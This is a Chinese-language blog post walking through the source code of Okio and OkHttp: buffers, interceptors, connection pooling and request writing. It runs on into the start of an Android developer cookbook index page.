//toByteArry内部调用了Arrays.copyOf()，创建了新对象 public BufferedInputStream(InputStream in, int size) { super(in); if (size &lt;= 0) { throw new IllegalArgumentException(&quot;Buffer size &lt;= 0&quot;); } buf = new byte[size]; //创建新数组 } public BufferedOutputStream(OutputStream out, int size) { super(out); if (size &lt;= 0) { throw new IllegalArgumentException(&quot;Buffer size &lt;= 0&quot;); } buf = new byte[size]; //创建数组 } 同样的事情在okio中是这么干的 RealBufferedSource(Source source) { if(source == null) { throw new NullPointerException(&quot;source == null&quot;); } else { this.source = source; //其实是buffer } } RealBufferedSink(Sink sink) { if(sink == null) { throw new NullPointerException(&quot;sink == null&quot;); } else { this.sink = sink; //只是挪一下指针 } } 由于一个Buffer即是source也是sink，挪一下指针就行了。写的时候往链表的尾巴写，读的时候从链表的头部读，读完了segment回收。 BufferedInputStream要求外部调用者带着一个固定大小的byte数组来取数据，难免会有人传进来一个特别小的数组，这样永远不可能读取超过这个数组大小长度的某一行。 读写这种事情操作起来总是从一个近似无限大的数据源 一点一点地取出来 存在一个内存中一个临时的地方， 然后再讲这部分数据交给其他接收方。 这就要求所有的读写都要准备进行多次读写，每次读到一个中转站中。在java io中这个中转站的大小是固定的，okio中这个中转站是一个个的Segment连接起来的。java io中各种decorater流之间的包装带来了System.arrayCopy new DataInputStream(new BufferedInputStream(new FileInputStream(&quot;&quot;))); 比如这样的代码，DataInputStream的read方法实际上传了一个byte[]，调用了BufferedInputStream的read方法，后者再将数据从自身arrayCopy到byte[]中。在Okio中，不存在这样的copy,Buffer的定义是”A collection of bytes in memory.”，与数组不同，Buffer之间传递数据的方式是挪指针。 BufferedSource在读取Socket数据时，一边从socket里面拿一个Segment大小的数据，然后调用readInt,readLong等方法返回int,long(同时从segment头部清空数据)。如果读到segment最后发现剩下的byte不能组成一个int，就会从segment pool中借一个segment，并从socket中读取数据塞满，把第一个segment剩下的一点byte和第二个segment的头部一点拼成一个int。以BufferSource的readInt为例: public int readInt() { if(this.size &lt; 4L) { throw new IllegalStateException(&quot;size &lt; 4: &quot; + this.size); } else { Segment segment = this.head; int pos = segment.pos; int limit = segment.limit; if(limit - pos &lt; 4) { //一个int 4个byte,这时候segment中未读的数据只剩下不到4个了 return (this.readByte() &amp; 255) &lt;&lt; 24 | (this.readByte() &amp; 255) &lt;&lt; 16 | (this.readByte() &amp; 255) &lt;&lt; 8 | this.readByte() &amp; 255; //readByte就是从链表的头部开始一个byte一个byte的读，segment读完了自动回收，直到组成一个int。 } else { //剩下的byte足够组成一个int byte[] data = segment.data; int i = (data[pos++] &amp; 255) &lt;&lt; 24 | (data[pos++] &amp; 255) &lt;&lt; 16 | (data[pos++] &amp; 255) &lt;&lt; 8 | data[pos++] &amp; 255; //从byte转int this.size -= 4L; if(pos == limit) { this.head = segment.pop(); SegmentPool.recycle(segment); //读完了就把segment回收 } else { segment.pos = pos; } return i; } } } 一个很有意思的现象是，java BufferedInputStream的默认buffer数组大小是8192，okio 的segment的默认size也是8192，这些都是以byte为单位的。找到一个合理的解释。大致意思是8192 = 2^13, windows和linux上这个大小正好占用两个分页文件(8kB)。另外java io的类图确实让人眼花缭乱。 2. OkHttp的解析2.1 使用介绍先上一张图。这是最简单的直接用OkHttpClient请求百度首页的堆栈调用情况。在没有做任何手动配置的情况下，至少发现了五个Interceptor: RetryAndFollowUpInterceptor BridgeInterceptor CacheInterceptor ConnectInterceptor CallServerInterceptor 走到CallServerInterceptor的时候，可以看到Response已经形成了。每一个Interceptor之间还有一个RealInterceptorChain，将各个Interceptor串联起来， 首先是调用者的代码 mClient = new OkHttpClient() //同步执行 Request request = new Request.Builder() .url(&quot;http:www.baidu.com&quot;) .build(); Call call = mClient.newCall(request); Response response = null; try { response = call.execute(); } catch (IOException e) { e.printStackTrace(); } //异步执行代码 Request request = new Request.Builder() .url(&quot;http:www.baidu.com&quot;) .build(); Call call = mClient.newCall(request); call.enqueue(new Callback() { @Override public void onFailure(Call call, IOException e) { } @Override public void onResponse(Call call, Response response) throws IOException { } }); 2.2 参数配置首先Request.Builder().build()方法，这里面只是使用Builder模式，和Retrofit很相似，方便链式调用。最终调用了Request的构造函数 Request(Request.Builder builder) { this.url = builder.url; //HttpUrl类型 this.method = builder.method; //String类型 this.headers = builder.headers.build(); //header就是个字典，内部用一个String数组维护。 this.body = builder.body;// RequestBody类型，用于POST提交表单或者Multipart上传文件。 this.tag = builder.tag != null?builder.tag:this; //Object类型 } Request里面的成员代表了一个网络请求所应该有的一切可能的元素，没什么可说的。OkHttpClient的构造也是Builder模式，一旦创建了不能setXX.找到一个比较丰富的例子 client = new OkHttpClient.Builder() .retryOnConnectionFailure(true) .connectTimeout(15, TimeUnit.SECONDS) //设置缓存 .cache(cache) .build(); 到这里都还只是发起真正的请求之前的configuration阶段，来看发起RealCall的过程 Call call = mClient.newCall(request); 这里面初始化了一个RetryAndFollowUpInterceptor。这个拦截器的作用是在连接server失败后自动重连，但服务器500就不会重连,参考okhttp-is-quietly-retrying-requests-is-your-api-ready 2.3 开始执行请求response = call.execute(); @Override public Response execute() throws IOException { synchronized (this) { if (executed) throw new IllegalStateException(&quot;Already Executed&quot;); executed = true; } captureCallStackTrace(); eventListener.callStart(this); try { client.dispatcher().executed(this);//这里只是把realCall添加到了Disptcher的RunningSyncall这个deque中，只是为了记个数，以及方便cancel Response result = getResponseWithInterceptorChain(); if (result == null) throw new IOException(&quot;Canceled&quot;); return result; } catch (IOException e) { eventListener.callFailed(this, e); throw e; } finally { client.dispatcher().finished(this);//从deque中移除 } } 重点就在getResponseWithInterceptorChain里面 Response getResponseWithInterceptorChain() throws IOException { List&lt;Interceptor&gt; interceptors = new ArrayList(); interceptors.addAll(this.client.interceptors()); interceptors.add(this.retryAndFollowUpInterceptor); interceptors.add(new BridgeInterceptor(this.client.cookieJar())); interceptors.add(new CacheInterceptor(this.client.internalCache())); interceptors.add(new ConnectInterceptor(this.client)); if(!this.forWebSocket) { interceptors.addAll(this.client.networkInterceptors()); } interceptors.add(new CallServerInterceptor(this.forWebSocket)); Chain chain = new RealInterceptorChain(interceptors, (StreamAllocation)null, (HttpCodec)null, (RealConnection)null, 0, this.originalRequest); return chain.proceed(this.originalRequest); } 注意顺序，用户手动添加的interceptor是最先添加的。在添加完ConnectInterceptor之后，又添加了networkInterceptors(用户手动添加的，一个List)。道理也很清楚，一种是在发起Socket请求之前就拦下来，一种是连上Socket之后的拦截 Chain的proceed就是从List中一个个取出Inerceptor，然后执行 关于异步请求的线程池问题，异步请求实际的调用是这样的Dispatcher.java synchronized void enqueue(AsyncCall call) { if (runningAsyncCalls.size() &lt; maxRequests &amp;&amp; runningCallsForHost(call) &lt; maxRequestsPerHost) { runningAsyncCalls.add(call);//当前运行的异步任务少于maxRequest，并且针对当前host发起的请求少于maxRequestsPerHost(默认是5个，也就是默认同时只能对1个域名发起5个请求，这个跟浏览器很像) executorService().execute(call);// 丢给线程池 } else { readyAsyncCalls.add(call);//添加到队列中去 } } /** Ready async calls in the order they&#39;ll be run. */ private final Deque&lt;AsyncCall&gt; readyAsyncCalls = new ArrayDeque&lt;&gt;(); //排队等待被执行的异步任务 /** Running asynchronous calls. Includes canceled calls that haven&#39;t finished yet. */ private final Deque&lt;AsyncCall&gt; runningAsyncCalls = new ArrayDeque&lt;&gt;();//正在运行中的异步任务 /** Running synchronous calls. Includes canceled calls that haven&#39;t finished yet. */ private final Deque&lt;RealCall&gt; runningSyncCalls = new ArrayDeque&lt;&gt;();//同步的运行的或者已经被取消的请求 异步请求：和浏览器相似，okhttp client也设定了客户端同时只能对一个host发起有上限的连接数(5个)，并且，所有的请求总数加在一起不超过64个。超过的加到一个Deque中，等异步任务执行完成后，有一个finally，这里面有一个promoteCalls，就是说可以去消费刚才排队的请求了。同步请求：而RealCall的execute方法就完全是一个在当前线程中执行的方法，没有任何限制，只是将这个请求加入了Dispatcher的runningSyncCalls中去了 所以，对于使用enqueue方法的应用，如果同时1s内对一个host发起的请求超过了5个，并且网络也特别差的情况下，需要等到至少timeout(connectTimeout)-1s的时间后才能轮到后续的请求执行。使用execute方法的则不受限制。 用户感知到的延时是：网络请求的时间 = 队列等待时间+dns解析时间+socket连接时间+socket io时间 OkHttpClient.Builder httpClientBuilder = new OkHttpClient.Builder() .readTimeout(30, TimeUnit.SECONDS) .connectTimeout(30, TimeUnit.SECONDS) .writeTimeout(30, TimeUnit.SECONDS) .addInterceptor(new HeaderInterceptor()) 关于timeout，外部设置的时候可以设定的超时包括: 连接socket的超时，读超时，写超时连接socket超时是直接调用socket.setSoTimeout实现的，这个是指，对这个socket的read操作只会堵塞这么长时间(就是说假如这么长时间内没有数据)，之后跑出一个SocketTimeoutException。 3. 自带的五个Interceptor3.1 RetryAndFollowUpInterceptor while(!this.canceled) { Response response = null; boolean releaseConnection = true; try { response = ((RealInterceptorChain)chain).proceed(request, this.streamAllocation, (HttpCodec)null, (RealConnection)null); releaseConnection = false; } catch (RouteException var13) { releaseConnection = false; continue; } catch (IOException var14) { releaseConnection = false; continue; } finally { if(releaseConnection) { this.streamAllocation.streamFailed((IOException)null); this.streamAllocation.release(); } } Request followUp = this.followUpRequest(response); if(followUp == null) { return response; } ++followUpCount; if(followUpCount &gt; 20) { this.streamAllocation.release(); throw new ProtocolException(&quot;Too many follow-up requests: &quot; + followUpCount); } } 这里面写死了一个循环，只要没有cancel，catch到特定的Exception就一直让链条走下去。 3.2 BridgeInterceptor这是第二个Interceptorinterceptors.add(new BridgeInterceptor(this.client.cookieJar()));//注意带进来了cookie，主要都是添加header什么的 public Response intercept(Chain chain) throws IOException { Request userRequest = chain.request(); if(userRequest.header(&quot;Host&quot;) == null) { requestBuilder.header(&quot;Host&quot;, Util.hostHeader(userRequest.url(), false)); } Response networkResponse = chain.proceed(requestBuilder.build()); okhttp3.Response.Builder responseBuilder = networkResponse.newBuilder().request(userRequest); } return responseBuilder.build(); } 都是些Host,Connection Keep-Alive,User-Agent,Content-Length等跟header有关的东西。随后将request交给链条的下一个interceptor。Response回来之后相应set-Cookie这些东西，下次请求带上cookie，这些都是Http的标准步骤。 3.3 CacheInterceptor接下来轮到cache，对于response的处理也是差不多的过程 public Response intercept(Chain chain) throws IOException { Response cacheCandidate = this.cache != null?this.cache.get(chain.request()):null; Request networkRequest = strategy.networkRequest; Response cacheResponse = strategy.cacheResponse; Response networkResponse = null; networkResponse = chain.proceed(networkRequest); Response response; if(cacheResponse != null) { if(networkResponse.code() == 304) { response = cacheResponse.newBuilder().headers(combine(cacheResponse.headers(), networkResponse.headers())).sentRequestAtMillis(networkResponse.sentRequestAtMillis()).receivedResponseAtMillis(networkResponse.receivedResponseAtMillis()).cacheResponse(stripBody(cacheResponse)).networkResponse(stripBody(networkResponse)).build(); networkResponse.body().close(); this.cache.trackConditionalCacheHit(); this.cache.update(cacheResponse, response); return response; //只针对304做了自动cache } Util.closeQuietly(cacheResponse.body()); } response = networkResponse.newBuilder().cacheResponse(stripBody(cacheResponse)).networkResponse(stripBody(networkResponse)).build(); return response; } 这里也是让请求接着走下去，response回来之后，只有304的时候才会去主动cache下来。 3.4 ConnectInterceptor(深入okHttp 3.9.1的connectionPool以及引用计数)在高并发的请求连接情况下或者同个客户端多次频繁的请求操作，无限制的创建连接会导致性能低下。所以OkHttp做到了对socket的复用和及时清理。从第四个intercepter开始ConnectInterceptor.java public final class ConnectInterceptor implements Interceptor{ @Override public Response intercept(Chain chain) throws IOException { RealInterceptorChain realChain = (RealInterceptorChain) chain; Request request = realChain.request(); // 第一步，获取streamAllocation StreamAllocation streamAllocation = realChain.streamAllocation(); // We need the network to satisfy this request. Possibly for validating a conditional GET. boolean doExtensiveHealthChecks = !request.method().equals(&quot;GET&quot;); // 第二步，使用streamAllocation创建(或者复用)一个httpCodec模型（即处理header和body的读写策略，具体实现包括Http1Codec和Http2Codec） HttpCodec httpCodec = streamAllocation.newStream(client, chain, doExtensiveHealthChecks); // 第三部，挑选出RealConnection,streamAllocation对象中的mConnection变量是在第二步里面赋值的 RealConnection connection = streamAllocation.connection(); return realChain.proceed(request, streamAllocation, httpCodec, connection); } } 所以socket连接复用就在这句话里面了 HttpCodec httpCodec = streamAllocation.newStream(client, chain, doExtensiveHealthChecks); StreamAllocation.java public HttpCodec newStream( OkHttpClient client, Interceptor.Chain chain, boolean doExtensiveHealthChecks) { // 省略部分，主要是这两句话 RealConnection resultConnection = findHealthyConnection(connectTimeout, readTimeout, writeTimeout, connectionRetryEnabled, doExtensiveHealthChecks); // HttpCodec resultCodec = resultConnection.newCodec(client, chain, this); } findHealthyConnection最终走到这里 // Attempt to get a connection from the pool. for (RealConnection connection : connections) { if (connection.isEligible(address, route)) { streamAllocation.acquire(connection, true); return connection; } } // 判断是否isEligible的方法在RealConnection里面 // If the non-host fields of the address don&#39;t overlap, we&#39;re done. if (!Internal.instance.equalsNonHost(this.route.address(), address)) return false; // 只要DNS,port,protocols等host无关的参数中有一个不同就不能复用 // If the host exactly matches, we&#39;re done: this connection can carry the address. if (address.url().host().equals(this.route().address().url().host())) { return true; // This connection is a perfect match. } // 这里说明host是相同的，上面的DNS什么的都是一样的，只有后面的path,query或者RequestBody不同，那么直接复用 所以这里socket复用的方式是直接使用RealConnection持有Socket对象的引用，每一次在RealConnection的connect成功后，都会讲这个socket包装成一个BufferedSource(读取Response)和BufferedSink(往外写Request)，在timeout时长内，socket不会被关闭。既然缓存就一定会有清理 在上面的findHealthyConnection中有一段 streamAllocation.acquire(connection, true); 这里面的作用就是将这条请求（Stream）添加到当前连接承载的一个List&lt;Reference&gt;中，也就是所谓的引用计数。提到这一点是要谈到清理的实现：ConnectionPool中有一个Executor，目的就是执行一个cleanupRunnable的Runnable，这里面的清理操作大致如下： long cleanup(long now) { // Find either a connection to evict, or the time that the next eviction is due. synchronized (this) { for (Iterator&lt;RealConnection&gt; i = connections.iterator(); i.hasNext(); ) { RealConnection connection = i.next(); // If the connection is in use, keep searching. if (pruneAndGetAllocationCount(connection, now) &gt; 0) { inUseConnectionCount++; //这条连接还在用 continue; } idleConnectionCount++; //这条连接现在空闲下来了 // If the connection is ready to be evicted, we&#39;re done. long idleDurationNs = now - connection.idleAtNanos;// 这条连接已经多久没用到了，假如超过了闲置时间(默认5纳秒)，就准备干掉这个socket if (idleDurationNs &gt; longestIdleDurationNs) { longestIdleDurationNs = idleDurationNs; longestIdleConnection = connection; } } // We&#39;ve found a connection to evict. Remove it from the list, then close it below (outside // of the synchronized block). // A connection will be ready to evict soon. // All connections are in use. It&#39;ll be at least the keep alive duration &#39;til we run again. // No connections, idle or in use. } // 在这前面如果找不到一条该被干掉的连接，直接return closeQuietly(longestIdleConnection.socket());// 这里面就是socket.close了 // Cleanup again immediately. return 0; } 观察一下ConnectionPool的构造函数 /** * Create a new connection pool with tuning parameters appropriate for a single-user application. * The tuning parameters in this pool are subject to change in future OkHttp releases. Currently * this pool holds up to 5 idle connections which will be evicted after 5 minutes of inactivity. */ // 最多保留5条闲置RealConnection(也就是底层5个Socket),每个连接(Socket)如果超过5分钟没有接客，直接干掉 public ConnectionPool() { this(5, 5, TimeUnit.MINUTES); } 所以，在创建Client的时候，可以把socket的缓存数量写大一点，也可以自定义一个ConnectionPool，只要实现了put,get,remove等标准的CRD操作就行了。简单来说就是自己设计一个Cache，我觉得可以根据实际的endpoint数量来设定缓存的socket的数量。 这里的interceptor方法异常简短 public Response intercept(Chain chain) throws IOException { RealInterceptorChain realChain = (RealInterceptorChain)chain; Request request = realChain.request(); StreamAllocation streamAllocation = realChain.streamAllocation(); boolean doExtensiveHealthChecks = !request.method().equals(&quot;GET&quot;); HttpCodec httpCodec = streamAllocation.newStream(this.client, doExtensiveHealthChecks); RealConnection connection = streamAllocation.connection(); return realChain.proceed(request, streamAllocation, httpCodec, connection); } 这里重点关注 StreamAllocation这个类 public final class StreamAllocation { public final Address address; private Route route; private final ConnectionPool connectionPool; private final Object callStackTrace; private final RouteSelector routeSelector; private int refusedStreamCount; private RealConnection connection; private HttpCodec codec; } 从HttpCodec httpCodec = streamAllocation.newStream(this.client, doExtensiveHealthChecks); 这句话一直往下走，会走到Socket.connect()，也就是大多数人初学网络编程时被教导的如何创建Socket连接。Stream代表一个api请求过程，RealConnection持有了真正的rawSocket。 StreamAllocation.findConnection中主要做了1.查看当前streamAllocation是否有之前已经分配过的连接，有则直接使用2.从连接池中查找可复用的连接，有则返回该连接3.配置路由，配置后再次从连接池中查找是否有可复用连接，有则直接返回4.新建一个连接，并修改其StreamAllocation标记计数，将其放入连接池中5.查看连接池是否有重复的多路复用连接，有则清除 从连接池中找connection的判断是 if (connection.isEligible(address, route)) { streamAllocation.acquire(connection, true); return connection; } public boolean isEligible(Address address, @Nullable Route route) { // If this connection is not accepting new streams, we&#39;re done. if (allocations.size() &gt;= allocationLimit || noNewStreams) return false; //注意啊，若不是HTTP/2的连接，则allocationLimit的值总是1 ///.... } 多个HTTP/1.1请求是不能在同一个连接上交叉处理(multiplexing)的，http1中一个socket只能同时处理一个stream请求,acquire类似于markInUse。这样的设计主要是为了实现HTTP/2 multi stream，http2所有stream都走一条tcp连接(一个socket)。在Http1Codec的endOfInput方法里会调用streamAllocation.streamFinished()方法，也就是说，我这stream(一次接口请求读完了，http1报文的空行读到了)用完了，socket还给pool，socket在http1场景下一次只能接一个请求。connectionPool里默认是最大5个空闲连接数(就是说最多同时存在5个没关的socket,并且每个socket如果5min内没干活，就关闭掉，因为socket也是系统资源)。 关于RouterSelector.Selection这个class，其实就是把DNS返回的多个查询record（InetSocketAddress，也就是ip地址存起来，当然存的是一个Route 对象，里头包住了InetSocketAddress)。所以可以粗略的认为一个Router对应一个ip地址吧，RouteDatabase就是一个HashSet，换ip的时候会对那些失败过的Route（ip）躲得远远的 StreamAllocation.newStream —-&gt; StreamAllocation.findHealthyConnection —&gt; StreamAallocation.findConnection —&gt; new RealConnection —&gt; RealConnection.connect RealConnection.connect()方法 public void connect(int connectTimeout, int readTimeout, int writeTimeout, boolean connectionRetryEnabled) { if(this.protocol != null) { throw new IllegalStateException(&quot;already connected&quot;); } else { while(true) { try { if(this.route.requiresTunnel()) { this.connectTunnel(connectTimeout, readTimeout, writeTimeout); } else { this.connectSocket(connectTimeout, readTimeout); } break; } catch (IOException var11) { if(!connectionRetryEnabled || !connectionSpecSelector.connectionFailed(var11)) { throw routeException; //这个Exception就是给RetryAndFollowupInterceptor准备的 } } } } } 最初学习Socket编程的时候，就是写了一个while(true)，是不是很像？ 对了ConnectionPool内部使用了一个Deque保存RealConnection,findConnection里面有这么一段 Internal.instance.get(this.connectionPool, this.address, this, (Route)null);//查找 Internal.instance.put(this.connectionPool, result);//放进pool connectSocket长这样: private void connectSocket(int connectTimeout, int readTimeout) throws IOException { Proxy proxy = this.route.proxy(); Address address = this.route.address(); this.rawSocket = proxy.type() != Type.DIRECT &amp;&amp; proxy.type() != Type.HTTP?new Socket(proxy):address.socketFactory().createSocket(); this.rawSocket.setSoTimeout(readTimeout); try { Platform.get().connectSocket(this.rawSocket, this.route.socketAddress(), connectTimeout); //这里面就一句话socket.connect } catch (ConnectException var7) { ConnectException ce = new ConnectException(&quot;Failed to connect to &quot; + this.route.socketAddress()); ce.initCause(var7); throw ce; } try { this.source = Okio.buffer(Okio.source(this.rawSocket)); this.sink = Okio.buffer(Okio.sink(this.rawSocket)); } catch (NullPointerException var8) { if(&quot;throw with null exception&quot;.equals(var8.getMessage())) { throw new IOException(var8); } } } 重点看this.source = Okio.buffer(Okio.source(this.rawSocket));this.sink = Okio.buffer(Okio.sink(this.rawSocket));通过sink往Socket里面写数据，通过source网Socket里面写数据，通过Okio包装了，虽然本质上还是socket.getOutputStream和Socket.getInputStream。到这一步，RealConnection内部sink和source初始化完成，socket已经连接上，Socket的inputStream和outPutStream都准备就绪。其实在这种状态下就已经可以开始读写了。 3.5 CallServerInterceptor这里已经连上了服务器，可以像操作本地文件一样读写数据了，当然要在遵守http规范的前提下。 public Response intercept(Chain chain) throws IOException { RealInterceptorChain realChain = (RealInterceptorChain)chain; HttpCodec httpCodec = realChain.httpStream(); StreamAllocation streamAllocation = realChain.streamAllocation(); RealConnection connection = (RealConnection)realChain.connection(); Request request = realChain.request(); //可以看到，到这一步所需要的数据都准备就绪 long sentRequestMillis = System.currentTimeMillis(); httpCodec.writeRequestHeaders(request); //开始写数据 Builder responseBuilder = null; if(HttpMethod.permitsRequestBody(request.method()) &amp;&amp; request.body() != null) { //这里面是跟POST相关的 if(&quot;100-continue&quot;.equalsIgnoreCase(request.header(&quot;Expect&quot;))) { httpCodec.flushRequest(); responseBuilder = httpCodec.readResponseHeaders(true); } if(responseBuilder == null) { Sink requestBodyOut = httpCodec.createRequestBody(request, request.body().contentLength()); BufferedSink bufferedRequestBody = Okio.buffer(requestBodyOut); request.body().writeTo(bufferedRequestBody); //这里就是Okio发挥高效的地方 bufferedRequestBody.close(); } else if(!connection.isMultiplexed()) { streamAllocation.noNewStreams(); } } httpCodec.finishRequest(); //到这里，client的数据全部写完并且发送给服务器，服务器开始干活。 if(responseBuilder == null) { responseBuilder = httpCodec.readResponseHeaders(false); //开始从Socket里面读取数据 } Response response = responseBuilder.request(request).handshake(streamAllocation.connection().handshake()).sentRequestAtMillis(sentRequestMillis).receivedResponseAtMillis(System.currentTimeMillis()).build(); int code = response.code(); if(this.forWebSocket &amp;&amp; code == 101) { response = response.newBuilder().body(Util.EMPTY_RESPONSE).build(); } else { response = response.newBuilder().body(httpCodec.openResponseBody(response)).build(); } if(&quot;close&quot;.equalsIgnoreCase(response.request().header(&quot;Connection&quot;)) || &quot;close&quot;.equalsIgnoreCase(response.header(&quot;Connection&quot;))) { streamAllocation.noNewStreams(); } if((code == 204 || code == 205) &amp;&amp; response.body().contentLength() &gt; 0L) { throw new ProtocolException(&quot;HTTP &quot; + code + &quot; had non-zero Content-Length: &quot; + response.body().contentLength()); } else { return response; } } 这里面就是一步步的开始写数据了。这里再借用下百度,chrome按下F12，打开百度首页，看下request的raw header GET / HTTP/1.1 Host: www.baidu.com Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 DNT: 1 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4 Cookie: PSTM=122178321; BIDUPSID=CF3243290400VSDG52B3859AD4AEC2; BAIDUID=5176CC0A23DB1F3423426454DRTG5EC8:FG=1; MCITY=-%3A; BD_HOME=0; H_PS_PSSID=1428_24320_20930; BD_UPN=1223214323 看下httpCodec.writeRequestHeaders(request)的实现，就会发现真的是这么一行一行的写的例如RequestLine.java public static String get(Request request, Type proxyType) { StringBuilder result = new StringBuilder(); result.append(request.method()); // GET result.append(&#39; &#39;); //空格 if(includeAuthorityInRequestLine(request, proxyType)) { result.append(request.url()); } else { result.append(requestPath(request.url())); //我们访问的是百度首页，当然是&#39;/&#39;这个Index啦 } result.append(&quot; HTTP/1.1&quot;); //是不是和上面一模一样 return result.toString(); } 接下来轮到Http1Codec.class public void writeRequest(Headers headers, String requestLine) throws IOException { if(this.state != 0) { throw new IllegalStateException(&quot;state: &quot; + this.state); } else { this.sink.writeUtf8(requestLine).writeUtf8(&quot;\\r\\n&quot;); //这是第一行，写完了加上换行符 int i = 0; for(int size = headers.size(); i &lt; size; ++i) { this.sink.writeUtf8(headers.name(i)).writeUtf8(&quot;: &quot;).writeUtf8(headers.value(i)).writeUtf8(&quot;\\r\\n&quot;); //一个header写完就写一个换行符 } this.sink.writeUtf8(&quot;\\r\\n&quot;); this.state = 1; } } 读取Response的顺序和写Request相反，不再赘述。 4.结语这里只是针对OkHttp发起的一个最简单同步的网络请求进行了分析。关于异步请求再说两句：本质上不过是包装了一个回调，丢到线程池里面，相比整个Http请求，实在是不值一提。来看下这个线程池 new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;(), Util.threadFactory(&quot;OkHttp Dispatcher&quot;, false)); 照说jdk不推荐这么创建线程池，一般用jdk封装好的CachedThreadPool，FixedThreadPool等等，但想必这样做也是不为了造成过大的系统开销吧。debug的时候如果看到OkHttp Dispatcher这条线程，应该明白是为什么了吧。另外，Okio会引入一条名为Okio WatchDog的线程，这跟Okio的AsyncTimeOut有关。时间关系(已经是夜里12点了)，不打算研究了。 OkHttp总量过于庞大，很多方面，包括spdy,webSocket,RouterDatabase,DNS,网络执行周期触发回调，http2，http协议，太多太多，再研究一天也看不完。 拎出来几个比较重要的点吧： Okio放在最前面，就是为了说明在网络请求这样对于io性能要求高的场合，okio避免了memory allocation和不必要的缓存复制。 OkHttpClient应该是对标apache的HttpClient的，后者不清楚。 底层还是调用操作系统的Socket接口，从这个角度来看，Retrofit只是一个Util，包括线程调度都是用的OkHttp的线程池；Volley我记得默认是4条NetWorkDispatcher和一个CacheDispatcher和一个ContentDelivery。 不推荐创建多个OkHttpClient，真想创建多个的话，用newBuilder(浅复制)就好了嘛。 网上说Picaso内部的cache其实就是OkHttp的cache，不愧square全家桶系列 和Retrofit一样，也是用的Builder模式，提供了极大的自定义空间 Interceptor，广受业界好评的责任链模式 写于2017年7月23日0:29 updateOkHttp拦截器里面能不能把请求取消掉? 结论几乎是否do-we-have-any-possibility-to-stop-request-in-okhttp-interceptor随便挑一个interceptor出来,上游传递下来的chain只能获取到Request，看了下,request并没有一个cancel的方法。真要cancel的话，得去OkHttpClient那边去cancel，这里并不能获得。就算你全局获得一个Client，这里还得返回一个Response。看了下proceed方法，如果返回null的话，会主动抛一个空指针出来的。 @Override public Response intercept(Chain chain) throws IOException { RealInterceptorChain realChain = (RealInterceptorChain) chain; Request request = realChain.request(); StreamAllocation streamAllocation = realChain.streamAllocation(); // We need the network to satisfy this request. Possibly for validating a conditional GET. boolean doExtensiveHealthChecks = !request.method().equals(&quot;GET&quot;); HttpCodec httpCodec = streamAllocation.newStream(client, chain, doExtensiveHealthChecks); RealConnection connection = streamAllocation.connection(); return realChain.proceed(request, streamAllocation, httpCodec, connection); } cancel ongoing requestCancelling async request by tag public void cancel(OkHttpClient client, Object tag) { for (Call call : client.dispatcher().queuedCalls()) { if (tag.equals(call.request().tag())) call.cancel(); } for (Call call : client.dispatcher().runningCalls()) { if (tag.equals(call.request().tag())) call.cancel(); } } 瞅了下call.cancel的实现，其实是对RealCall里面的成员变量RetryAndFollowUpInterceptor调用了cancel方法 动态调节timeout,也就是说随时可以修改网络请求的timeout RealInterceptorChain.java中有这么三个方法，Interceptor.Chain withConnectTimeout(int timeout, TimeUnit unit)Interceptor.Chain withReadTimeout(int timeout, TimeUnit unit)Interceptor.Chain withWriteTimeout(int timeout, TimeUnit unit) @Test public void chainWithReadTimeout() throws Exception { Interceptor interceptor1 = new Interceptor() { @Override public Response intercept(Chain chainA) throws IOException { assertEquals(5000, chainA.readTimeoutMillis()); //if 网络较差。。。 Chain chainB = chainA.withReadTimeout(100, TimeUnit.MILLISECONDS); assertEquals(100, chainB.readTimeoutMillis()); return chainB.proceed(chainA.request()); } }; } 所以完全可以在网络条件较差的时候修改后续的网络请求的timeout 设计模式当一个网络请求发出时,需要经过应用层-&gt;传输层-&gt;网络层-&gt;连接层-&gt;物理层收到响应后正好反过来,物理层-&gt;连接层-&gt;网络层-&gt;传输层-&gt;应用层在请求经过各层时,由每层轮流处理.每层都可以对请求或响应进行处理.并可以中断链接,以自身为终点返回响应 5. 参考 Paisy Frodo系列 A few ok library Forcing bytes downward in Okio","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"日常开发手册","date":"2017-07-12T08:40:08.000Z","path":"2017/07/12/2017-07-12-android-cookbook/","text":"A Cookbook shall look like a collection of Recipes, or an index page from where dinner are made. And it keeps you sane. github上已经star了四百多个项目，应该复习下了。 各个平台相关的特定的一些记录布局相关的点theme和Style Dan lew 事件分发，动画，自定义Viewandroid使用selectableItemBackground的一些坑activity transition pre and post lollipop事件分发流程安卓坐标系常用方法android-Ultra-pull-to-refresh分析 内存管理内存泄漏 任务管理使用Loader进行异步数据操作 V4包里面的东西使用RecyclerView的Animation Android Dev Summit 2015 yigit boyar和Chet Haase自定义LayoutManager Dave SmithFragment源码解析 底层原理主线程的工作原理 Michael Bailey American Express, 他2016年还讲了LayoutInflater的工作原理vsync原理解释让service常驻后台的方法//下面这些已经有人写的很好了，直接看就可以了应用进程启动流程Launcher启动流程SystemServer进程启动流程Zygote进程启动流程Apk安装流程Activity启动流程//这个博主写的一系列底层分析都比较清楚 图片出自搜狐Activity的生命周期Instant Run的工作原理插件化加载就两件事，代码加载，资源加载 新版本适配，新特性Android 7.0的适配 工具方法沉浸式状态栏replace butterKnife with databinding 拆轮子Glide源码解析Rxjava2的一些点 Jake WhartonRetrofit源码解析OkHttp和Okio源码解析 跟java相关的java集合类的实现原理Java线程池的一些点使用AnnotationProcessor自动生成代码翻译了一个印度口音的关于jvm架构的视频一个Java Object到底占用多少内存(from java code to java heap)LruCache的原理 工具书git常用操作手册adb常用命令手册 杂乱的点java中的任何细碎的点 ToDo ListJava相关 [X] 画一下java的集合框架 [X] String StringBuffer StringBuilder区别(StringBuffer很多方法都加了synchronized) [ ] 多线程异步断点续传框架原理,利用该原理在图片加载框架中的应用(MappedByteBuffer或者RandomAccessFile) [X] 多线程断点续传原理，大文件下载oom问题 [X] java位运算，Collection框架中多次用到了 [ ] gson的原理，cache什么的，常规json解析器的原理 [ ] 